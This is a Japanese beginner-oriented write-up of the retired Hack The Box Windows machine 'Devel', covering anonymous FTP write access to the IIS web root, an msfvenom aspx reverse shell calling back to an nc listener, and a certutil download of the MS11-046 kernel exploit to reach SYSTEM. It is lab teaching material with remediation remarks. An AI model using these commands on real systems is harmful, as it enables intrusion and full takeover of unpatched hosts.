---
title: "[ HTB ] Devel | Writeup"
emoji: "🛠️"
type: "tech"
topics: ["Security", "writeup", "Cyber Security", "hacking", "Hack The Box"]
published: false
---

## README

- 初学者の、初学者による、初学者のためのWriteupです。
- 「なぜその判断に至ったのか」「なぜそのコマンドを実行しようと考えたのか」など、各アクションに至った思考回路部分についても触れています。
- 尚、一部正確でない表現が含まれている場合があります。
- 一応実務でもペネトレーションテストをやっているので、（たまに）実務目線のコメントも挟みます。

### 想定読者

- HTBなどのCTF/ペネトレーションテスト演習に興味がある初学者
- Linuxの基本的なコマンド操作、HTTP/SMB/Kerberosなどのプロトコルについてある程度の前提知識がある方(本記事内でも簡単な用語解説を挟んでいます)

## Machine Profile

Machine Name: Devel
Difficulty: Easy
OS: Windows

https://app.hackthebox.com/machines/Devel

## Setup

対象IPを`RHOSTS`という環境変数に入れておく。IP手打ちなどによるミスを防止

```sh
┌──(root㉿5602a1b7889d)-[~/Devel]
└─# echo 'export RHOSTS="10.10.10.5"' | tee -a .zshrc
export RHOSTS="10.10.10.5"
```

設定反映

```sh
┌──(root㉿5602a1b7889d)-[~/Devel]
└─# source .zshrc
```

動作確認＆疎通確認

```sh
┌──(root㉿5602a1b7889d)-[~/Devel]
└─# ping -c 4 ${RHOSTS}
PING 10.10.10.5 (10.10.10.5) 56(84) bytes of data.
64 bytes from 10.10.10.5: icmp_seq=1 ttl=127 time=24.5 ms
64 bytes from 10.10.10.5: icmp_seq=2 ttl=127 time=23.8 ms
64 bytes from 10.10.10.5: icmp_seq=3 ttl=127 time=25.1 ms
64 bytes from 10.10.10.5: icmp_seq=4 ttl=127 time=24.2 ms

--- 10.10.10.5 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 23.800/25.100/24.400/0.500 ms
```

## Enumeration

### Nmap

一旦Nmap、兎にも角にもNmap、寝ても起きてもNmap。

まずはTop1000ポートに対して実行。

```sh
┌──(root㉿5602a1b7889d)-[~/Devel]
└─# nmap -sSV -Pn -n -r -T4 -oN nmap_top1000.txt ${RHOSTS}
Starting Nmap 7.94SVN
Nmap scan report for 10.10.10.5
Host is up (0.024s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

`-sSV`: SYNスキャン＋Versionスキャン  
`-Pn`: Pingチェック無効化  
デフォルトだとPingが通らないとスキャンが始まらないが、このチェックを省略し若干の時短を図る  
`-n`: 名前解決無効化。同じく時短目的  
`-r`: ポートスキャンを昇順に行う。特に意味はない、好み  
フルポートスキャン中にWiresharkなどで覗き見した際に、いまどこまで回っているかを確認するために使用することが多い  
`-T 4`: 並列スキャン数増加。未指定時はデフォルトの3が選択される、時短  
`-oN`: 結果を保存するファイル名を指定  

---

結果、開いていたのは `21/tcp FTP` と `80/tcp HTTP(IIS 7.5)` の2つのみ。IIS 7.5はWindows 7 / Windows Server 2008 R2 相当なので、全体的に少し古めの環境と推測できる。

### 21/FTP

> 21/tcp open  ftp     Microsoft ftpd

:::details FTPとは？
読み方: エフティーピー

正式名称: File Transfer Protocol

意味: 名前の通り、ファイル転送用のプロトコル。古くからあり、通信は平文。認証無しで接続できる「匿名(anonymous)ログイン」が設定されている場合がある。
:::

バージョン情報が取れていないため、設定不備(匿名ログイン有効など)が無いかをまず確認する。認証試行はNetExec[^1]でサクッと済ませる。

:::details NetExec(nxc)とは？
読み方: ネットエグゼク

意味: SMB/WinRM/FTP/RDP/MSSQL/LDAPなどに対して認証確認・列挙・コマンド実行をまとめて行えるツール。CrackMapExec(cme)の後継。1行でサクッと認証試行や情報収集ができるので、Windows系のマシンでは定番。
:::

匿名ログインの可否を確認する。

```sh
┌──(root㉿5602a1b7889d)-[~/Devel]
└─# nxc ftp ${RHOSTS} -u anonymous -p ''
FTP         10.10.10.5      21     10.10.10.5       [*] Banner: Microsoft FTP Service
FTP         10.10.10.5      21     10.10.10.5       [+] anonymous:
```

> [+] anonymous:

`[+]`が付いているため、匿名ログインが有効。次に`ftp`クライアントで実際に接続して中身を見る。

```sh
┌──(root㉿5602a1b7889d)-[~/Devel]
└─# ftp ${RHOSTS}
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

> iisstart.htm
> welcome.png
> aspnet_client

`iisstart.htm`はIISのデフォルトスタートページ、`welcome.png`も同じくIISのデフォルト画像、`aspnet_client`もASP.NETの関連ディレクトリ。つまり、このFTP領域はIISのWebルート(`C:\inetpub\wwwroot`)そのものを指している可能性が高い。

### 80/HTTP

> 80/tcp open  http    Microsoft IIS httpd 7.5

:::details IIS 7.5とは？
読み方: アイアイエス

正式名称: Internet Information Services

意味: Microsoft製のWebサーバ。Windows Server系列に標準で付いてくる。`.aspx`などASP.NETのスクリプトが動く。バージョン7.5は Windows 7 / Windows Server 2008 R2 に同梱されている世代。
:::

ブラウザで`http://10.10.10.5/`を開いても、`iisstart.htm`+`welcome.png`のIISデフォルトページが表示されるだけ。FTPで見えていたファイルと一致しているため、やはりFTPの格納先 ＝ IISのWebルートで間違いなさそう。

念のためFTPへの書き込み可否も確認する。先ほどの`ls`時のファイルタイムスタンプが2017年のままなため、匿名ユーザがそもそも書き込み可能かが怪しいが、ハッキリさせておく。

```sh
ftp> put test.txt
local: test.txt remote: test.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
```

書き込みも成功。IISのWebルートに匿名ユーザがRead/Writeで書き込める、という状況が確定した。

:::message
匿名FTPでRead/Writeが許可されており、しかも配置先がIISのWebルートと一致している。設定不備の脆弱性(匿名ユーザへの過剰権限付与)と、Webルート直書き込みという構成不備が重なった状態。
Webルートに実行可能なスクリプト(aspxなど)を置ければIISが実行してくれる、という典型的な侵入経路に直結する。
:::

## Foothold

匿名FTPでWebルートに書き込める、かつIISがaspxを実行してくれる。流れとしては、

1. Kali側でaspxのリバースシェルを作る
2. FTPでそれをWebルートにアップロード
3. ブラウザ or `curl`から対象のaspxを叩いてIIS経由で実行させる
4. Kali側で待ち構えていたリスナーに接続が返ってくる

という定石ルート。

:::details msfvenomとは？
読み方: エムエスエフベノム

意味: Metasploitに同梱されているペイロード生成ツール。aspx/exe/elf/pyなど様々な形式のリバースシェル・バインドシェル等を1コマンドで吐き出せる。
:::

aspxのリバースシェルを作る。この後の権限昇格は手動で進めるため、Meterpreterではなく素のリバースシェル(`shell_reverse_tcp`)で十分。

```sh
┌──(root㉿5602a1b7889d)-[~/Devel]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2887 bytes
Saved as: shell.aspx
```

`-p`: 使うペイロード  
`LHOST`/`LPORT`: 自分(Kali)側のIPと待受ポート  
`-f aspx`: aspx形式で出力  
`-o`: 出力ファイル名  

出来上がったaspxをFTPでアップロードする。

```sh
┌──(root㉿5602a1b7889d)-[~/Devel]
└─# ftp ${RHOSTS}
...
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2887 bytes sent in 0.00 secs
```

別ターミナルで`nc`を起動し、リスナーを立てておく。

:::details ncとは？
読み方: ネットキャット

正式名称: netcat

意味: TCP/UDPの読み書きを何でも出来てしまう万能ツール。ここではリバースシェルの受け口として使う。ネットワーク界のスイスアーミーナイフとも呼ばれる(らしい)。
:::

```sh
┌──(root㉿5602a1b7889d)-[~/Devel]
└─# nc -lvnp 4444
listening on [any] 4444 ...
```

リスナーが立ったら、`curl`で`http://10.10.10.5/shell.aspx`を叩いてaspxをIISに実行させる。

```sh
┌──(root㉿5602a1b7889d)-[~/Devel]
└─# curl http://${RHOSTS}/shell.aspx
```

`nc`側に接続が返ってくる。

```sh
┌──(root㉿5602a1b7889d)-[~/Devel]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.5] 49159
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```

> iis apppool\web

IISのアプリケーションプールユーザとしてシェルを取得。カレントディレクトリがIIS実行時の既定である`C:\Windows\system32\inetsrv`になっている点だけ覚えておく(ここは`iis apppool\web`に書き込み権限が無いため、後で作業用に別ディレクトリに移動する必要がある)。

user.txtを探す。

```sh
c:\windows\system32\inetsrv>cd C:\Users
cd C:\Users

C:\Users>dir
dir
...
2017/03/17  22:16    <DIR>          babis
...

C:\Users>type babis\Desktop\user.txt
type babis\Desktop\user.txt
```

user.txtを取得。

:::details なぜユーザフラグの場所がすぐにわかったのか
ユーザフラグは大体ユーザの`Desktop\`に格納されているケースが多いため。Windowsの場合は`C:\Users\<username>\Desktop\user.txt`が定番。
:::

:::message
匿名FTPによるIISのWebルートへの任意ファイル書き込みから、aspxリバースシェルの実行まで一直線に繋がった形。原因は、FTPの設定不備(匿名ユーザに書き込み権限)と、FTP領域とIISのWebルートが同一の格納領域として共有されていたこと。
Webアプリの実行権限で動くユーザ(ここでは`iis apppool\web`)に落ちた形。
:::

## Privilege Escalation

まずは対象のOS/アーキテクチャ/適用済みKBを確認。

```sh
c:\windows\system32\inetsrv>cd C:\Windows\Temp
cd C:\Windows\Temp

C:\Windows\Temp>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
...
System Type:               X86-based PC
...
Hotfix(s):                 N/A
```

> OS Name: Microsoft Windows 7 Enterprise
> OS Version: 6.1.7600
> System Type: X86-based PC
> Hotfix(s): N/A

Windows 7 の初期ビルド(SP無し)で、パッチも一切当たっていない x86 環境。この時点で、古めのカーネル系CVEがほぼ全部通る状況。

:::details なぜ`C:\Windows\Temp`に移動したのか
初期シェルのカレントは`C:\Windows\system32\inetsrv`だが、ここは`iis apppool\web`に書き込み権限が無い。この後PoCバイナリをダウンロードして実行する必要があるため、`iis apppool\web`でも書き込める作業用ディレクトリとして定番の`C:\Windows\Temp`に移動しておく。
:::

未適用KBから成立しそうなCVEを特定するため、`systeminfo`の出力をKali側に持ってきて`wesng`に食わせる。

:::details wesng (windows-exploit-suggester-ng)とは？
読み方: ウェズエヌジー

意味: `systeminfo`の出力を食わせると、未適用のKBから成立しそうなローカル権限昇格のCVEを一覧化してくれるツール[^2]。元祖の`windows-exploit-suggester`はDB更新が止まっているため、現在はPython3対応で後継の`wesng`を使うのが定番。
:::

```sh
┌──(root㉿5602a1b7889d)-[~/Devel]
└─# wes.py systeminfo.txt
...
Date: 20100302
CVE: CVE-2010-0232
KB: KB977165
Title: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (MS10-015, KiTrap0D)
Affected product: Windows 7
Severity: Important
Exploits: https://www.exploit-db.com/exploits/11199/
...
Date: 20110510
CVE: CVE-2011-1249
KB: KB2503665
Title: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (MS11-046)
Affected product: Windows 7
Severity: Important
Exploits: https://www.exploit-db.com/exploits/40564/
...
```

> MS10-015 (KiTrap0D) / MS11-046 (AFD.sys)

「Windows 7 x86 無印 Hotfix無し」の定番メニューが並ぶ。中でもMS11-046は、公開PoCのコンパイル済みバイナリ(exe)がgithub等[^3]に転がっており、Metasploitに頼らず単発バイナリ1つで決着するため扱いやすい。これで試す。

:::details MS11-046 / CVE-2011-1249とは？
意味: Windowsの補助機能ドライバ(Afd.sys)に起因するローカル権限昇格の脆弱性。細工した入力でカーネル空間での書き込みを引き起こし、呼び出し元プロセスを`NT AUTHORITY\SYSTEM`権限に昇格させる。Windows 7(x86/x64)やServer 2008系で広く成立する、古典的な権限昇格のド定番の一つ。
:::

対象端末が外部インターネットに出られる保証はないので、Kaliに簡易HTTPサーバを立てて、対象側から取りに行く方式にする。ファイル取得は`certutil`で行う。

:::details certutilとは？
意味: Windowsに標準で入っている証明書関連のユーティリティ。副作用的にURL経由のファイルダウンロード機能(`-urlcache -f`)を持っており、ペンテストや侵入後の作業では外部からのファイル取得手段として重宝する。「LOLBAS(Living Off The Land Binaries And Scripts)」の代表格[^4]。
:::

Kali側で簡易HTTPサーバを起動。

```sh
┌──(root㉿5602a1b7889d)-[~/Devel]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

対象側(`C:\Windows\Temp`)からcertutilで取りに行く。

```sh
C:\Windows\Temp>certutil -urlcache -split -f http://10.10.14.5/ms11-046.exe ms11-046.exe
certutil -urlcache -split -f http://10.10.14.5/ms11-046.exe ms11-046.exe
****  Online  ****
  000000  ...
CertUtil: -URLCache command completed successfully.
```

実行する。PoCは第一引数に実行したいコマンドを渡す仕様なので、`whoami`を投げてSYSTEM権限で返ってくるかを確認する。

```sh
C:\Windows\Temp>ms11-046.exe "whoami"
ms11-046.exe "whoami"
nt authority\system
```

> nt authority\system

SYSTEM権限で実行が通った。あとはroot.txtを読むだけ。

```sh
C:\Windows\Temp>ms11-046.exe "type C:\Users\Administrator\Desktop\root.txt"
```

root.txtを取得。

:::details より安定した運用がしたい場合
PoCで任意コマンドを打つのではなく、PoC経由でSYSTEM権限の対話シェルを生やしておく方が後々ラク。例えば、Kali側で`nc`リスナーをもう1本立てておき、`ms11-046.exe "cmd.exe /c <nc for Windows への接続>"`のような形で改めてリバースシェルを返すのが定番。
:::

:::message
Windows 7(SP無し)かつHotfix未適用という、OSのパッチ未適用の脆弱性に起因する権限昇格。IIS APPPOOLのような低権限ユーザから、カーネル脆弱性1発でSYSTEMまで突き抜けられる、Easy帯の典型例。
実務的には、EOLに達したOS(Windows 7は2020年1月サポート終了)が残っている時点でアウトという話。見つけたら権限昇格の指摘云々より前に「どうしてここに居るのか」のヒアリングから始まる案件。
:::

## まとめ

改めて攻撃チェーンを整理すると以下の通り。

1. Nmapで`21/FTP`(Microsoft ftpd)と`80/HTTP`(IIS 7.5)を確認
2. nxcで匿名FTPログインが有効と判明し、`ftp`クライアントでIISのWebルートにRead/Write可能なことを確認(設定不備の脆弱性)
3. msfvenomでaspxリバースシェルを生成→FTPでWebルートに配置→`curl`でHTTPアクセスし発火、`iis apppool\web`としてfoothold取得
4. `systeminfo`からWindows 7 x86・Hotfix未適用を確認し、wesngでMS11-046(Afd.sys)を特定
5. `C:\Windows\Temp`でcertutil経由でPoCを取得・実行、`NT AUTHORITY\SYSTEM`まで一気に昇格

Easy表記通り、Windowsの古典的な「匿名FTP悪用」と「未パッチ環境のカーネル権限昇格」を一本道でなぞる構成。令和の現場ではまず見かけない組み合わせだが、「サービスのデフォルト設定を本番環境に残したまま」というアンチパターンそのもので、学習教材としてはちょうどよいサンプル。

ちなみにHTBなのでやらないですが、実務では後始末もやっています。

## 免責事項

- 本記事はセキュリティ学習・知識共有を目的としています。
- 記載しているコマンド・攻撃手法は、自分が管理する環境、または明示的に許可を得た環境でのみ実行してください。他者の環境に無断で使用した場合、不正アクセス禁止法などの法令に抵触する可能性があります。
- 本記事の内容によって生じたいかなる損害についても、筆者は責任を負いかねます。

## HTBのポリシーについて

Hack The Boxでは、Retired状態のマシンに限りWriteupの公開が認められています。Activeなマシンの解法を公開する行為は利用規約違反にあたるため、本記事の対象マシンは執筆時点でRetiredであることを確認しています。

[^1]: https://github.com/Pennyw0rth/NetExec
[^2]: https://github.com/bitsadmin/wesng
[^3]: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046
[^4]: https://lolbas-project.github.io/lolbas/Binaries/Certutil/
